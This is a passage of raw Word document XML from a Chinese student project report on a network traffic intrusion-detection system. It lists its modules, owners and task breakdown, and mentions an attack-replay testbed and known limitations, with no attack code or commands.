            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="788CAAD0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>训练 5 个候选，在线只加载 1 个 best_model.pkl</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="44DA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47142784">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0D37F4F0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>大模型自然语言诊断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0947FF4B">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38AABBC8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>潘凤乐</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="56213BC2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>五段式结构化报告 + 多轮追问 + 模板降级</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="7F8C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0EBCCE53">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="16582691">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Web 可视化看板</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5194A4AA">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6FAB2CC2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>王储</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F8EE27A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>实时总览 / 告警 / 诊断报告 / 历史查询</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3245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0F65C1D0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5CDFE35C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>中心服务与边缘通信</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="60B78DDE">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7A00568E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>姚霖锋</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6FDA2667">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FastAPI 八个路由，Token 鉴权，SQLite 四表</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3605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54F50DB6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="748F74A4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>攻击复现实验台</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0801A78C">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18155C20">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>姚霖锋</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="76D139D5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>端口扫描 / SYN 洪泛 / ping 洪泛，带安全护栏</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5C813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2DDC78BC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F3E5FA4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>模型对比实验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7286F95B">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0CF23339">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>孙贤泽</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4923063E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>五模型同口径对比，前向滚动验证选型</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3396D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108EF09F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="40914937">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>RAG 协议知识库</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6B9FCF81">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6B7AEB94">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>潘凤乐</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27D815C3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>12 条协议知识，字符二元组 BM25 检索</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="6975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007D94B7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="21FAEBC1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>双探针联动演示</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="12C7A049">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>未完成</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="60F0E819">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>姚霖锋</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0AA045DD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>设计完成，第二台机器未到位，未做端到端演示</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="1FD8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229FED06">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="20CA5337">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>阈值规则引擎基线</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1AB3228C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>完成</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="408A1D7C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>王储</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="35B89B30">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>单流规则 + 窗口规则 + 去重域，同口径评测</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18CF41D1">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13451E47">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>需要说明的两点限制，后面的实现章节会展开：其一是本机没有 CAP_NET_RAW 权限，抓包模块无法在答辩机上对真实网卡运行，演示时用一个回放脚本把数据集中的会话经真实 HTTP 接口送进中心，被替换的只有“帧从哪里来”这一环；其二是项目只在一台机器上完整跑通过，M10 的双探针协同只是设计，没有联调。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F62AC2E">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:pageBreakBefore/>
        <w:spacing w:before="360" w:after="200" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>二、任务内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1440F2">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.1 总体任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE4CA86">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>总目标是构建一个可演示、可评测、边界清楚的四层网络流量分析系统，把“抓包—判定—解释—展示”串成一条闭环链路，并对每一环给出可复现的量化证据。具体分解为五项任务：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6516E692">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（1）写一个基于 scapy 的探针，能把一段流量解析成双向会话，并按 CICFlowMeter 口径汇总成 78 维特征；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CD0DC2">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（2）实现中心服务，接收探针上报、鉴权落库、调用分类器、产生告警；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0E5DD5">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（3）训练并对比五个分类模型，用站得住的口径选出上线模型；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A654CF3">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（4）接入大语言模型，把告警的证据链转成结构化的中文诊断报告，并支持追问；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06773D0D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（5）做一个看板，实时展示流量、告警与报告，让人能在浏览器里用起来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D4D088">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.2 模块划分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131A456D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>11 个模块的划分依据是“每一块能单独验收”。模块之间只通过三个接口耦合：探针 → 中心的 HTTP 上报、中心 → 大模型的 JSON 请求、中心 → 看板的只读查询。这样任何一块出问题都能被定位到具体模块，也便于四个人并行开发。模块与源文件的对应关系如下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507B160B">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 2-1　模块与源文件的对应关系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4"/>
        <w:gridCol w:w="2381"/>
        <w:gridCol w:w="3175"/>
        <w:gridCol w:w="2268"/>
      </w:tblGrid>
      <w:tr w14:paraId="29A2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4" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6F51BAD3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>模块</w:t>
            </w:r>
          </w:p>
